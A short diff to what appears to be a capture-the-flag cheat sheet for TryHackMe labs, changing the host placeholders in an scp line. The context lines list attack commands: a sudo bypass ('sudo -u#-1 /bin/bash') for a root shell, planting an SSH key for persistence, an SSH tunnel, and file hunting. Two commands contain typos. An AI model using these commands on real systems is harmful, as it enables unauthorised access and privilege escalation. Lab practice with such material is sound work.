@@ -54,7 +54,7 @@ find / -type -f -name "*.log" 2> /dev/null
 find / -type f -name "*.bak" 2> /dev/null
 ssh -L 9001:127.0.0.1:9001 -i id_rsa user@{rhost}
 cat id_rsa.pub >> authorization_keys
-scp -P {lport} user@{lhost}:/home/user/exploit /home/kali/tryhackme
+scp -P {rport} user@{rhost}:/home/user/exploit /home/kali/tryhackme
 sudo -u#-1 /bin/bash
 cat /etc/crontab
 steghide extract -sf file.jpg
